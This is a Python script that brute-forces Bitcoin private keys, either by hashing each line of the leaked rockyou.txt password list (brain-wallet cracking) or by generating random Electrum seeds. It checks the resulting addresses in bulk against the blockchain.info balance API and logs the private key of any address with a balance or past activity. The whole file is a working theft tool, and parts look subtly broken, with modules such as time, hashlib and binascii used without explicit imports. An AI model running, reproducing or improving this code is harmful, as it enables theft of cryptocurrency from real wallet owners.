#!/usr/bin/python3

from threading import Thread
from time import ctime
from cryptos import *
import multiprocessing
import requests
import urllib3
import base58
import json
import os


# Number of wallets verify per request to blockchain.info API.
# Number maximum is 138 and minimum is 1.
n = 138

# Don't change the values below
total = 0
b58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'

# Disabled Insecure Request Warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Wordlist or Brute Force

if (os.getenv("WORDLIST", 'False').lower() in ('true', '1', 't')) is True:
    wordlist = True
else:
    wordlist = False


def write_logs(file, output):
    if file == "error":
        f = open("logs/error.txt", "a")
    elif file == "keys":
        f = open("logs/keys.txt", "a")
    else:
        print("%s - ERROR - Log file don't found: %s" % (ctime(), file))
        return

    output = output + "\n"
    f.write(output)
    f.close()


def wif_uncompressed(byte, raw_private_key):
    extended_key = byte+raw_private_key

    first_sha256 = hashlib.sha256(binascii.unhexlify(extended_key[:66])).hexdigest()
    second_sha256 = hashlib.sha256(binascii.unhexlify(first_sha256)).hexdigest()

    final_key = extended_key[:66]+second_sha256[:8]

    wif = base58.b58encode(binascii.unhexlify(final_key))
    return wif.decode("utf-8")


def generate_addresses(q, n, wordlist):

    if wordlist is True:

        with open("E:/rockyou.txt", errors="ignore") as fp:
            file_name = os.path.basename(fp.name)
            print("%s - File %s opened" % (ctime(), file_name))

            addresses = []

            for i, line in enumerate(fp):

                while q.qsize() >= 20:
                    time.sleep(1)

                raw_private_key = line

                if len(addresses) < n:
                    wallet = [wif_uncompressed('80', sha256(raw_private_key)), pubtoaddr(privtopub(sha256(raw_private_key)))]
                    addresses.append(wallet)

                else:
                    q.put(addresses)
                    addresses = []

    else:
        while True:
            if q.qsize() < 5:
                addresses = []

                for address in range(0, n):
                    raw_private_key = random_electrum_seed()
                    wallet = [raw_private_key, pubtoaddr(privtopub(raw_private_key))]
                    addresses.append(wallet)

                q.put(addresses)


def verify_addresses(addresses, n):
    url = create_url(addresses, n)

    try:
        req2 = requests.get(url)
        if req2.status_code == 200:
            content2 = req2.content

            addresses2 = json.loads(content2.decode("utf-8"))
            for xy in addresses2:

                if addresses2['%s' % xy]['final_balance'] != 0:

                    for xyz in range(0, n):

                        if addresses[xyz][1] == xy:
                            output = ("PublicKey:%s Balance:%s PrivateKey:%s" % (
                                xy, addresses2['%s' % xy]['final_balance'], addresses[xyz][0]))

                            print(output)
                            write_logs("keys", output)

                if addresses2['%s' % xy]['total_received'] != 0:

                    for xyz in range(0, n):

                        if addresses[xyz][1] == xy:
                            output = ("PublicKey:%s Received:%s PrivateKey:%s" % (
                                xy, addresses2['%s' % xy]['total_received'], addresses[xyz][0]))

                            print(output)
                            write_logs("keys", output)
            return True

        else:
            print("%s - Error - Status Code: %s - URL: %s" % (ctime(), req2.status_code, url))
            return False

    except:
        return False


def create_url(addresses, n):
    public_keys = ""

    for i in range(0, n):
        public_keys += addresses[i][1]

        if i < n - 1:
            public_keys += "|"

    url = "https://blockchain.info/balance?active=" + public_keys
    return url


class Th(Thread):
    def __init__(self, num):
        Thread.__init__(self)
        self.num = num

    def run(self):
        while True:
            time.sleep(10)
            print("%s - INFO - Total verified: %s" % (ctime(), total))


if __name__ == '__main__':
    try:
        os.mkdir("logs")
        print("%s - INFO - The directory logs created" % ctime())

    except FileExistsError:
        print("%s - INFO - The directory logs exist" % ctime())

    a = Th(1)
    a.start()

    q = multiprocessing.Queue()

    r = multiprocessing.Process(name='generate_addresses', target=generate_addresses, args=(q, n, wordlist))
    r.start()

    p = multiprocessing.Process(name='generate_addresses', target=generate_addresses, args=(q, n, wordlist))
    p.start()

    s = multiprocessing.Process(name='generate_addresses', target=generate_addresses, args=(q, n, wordlist))
    s.start()

    while True:
        if verify_addresses(q.get(), n):
            total += n
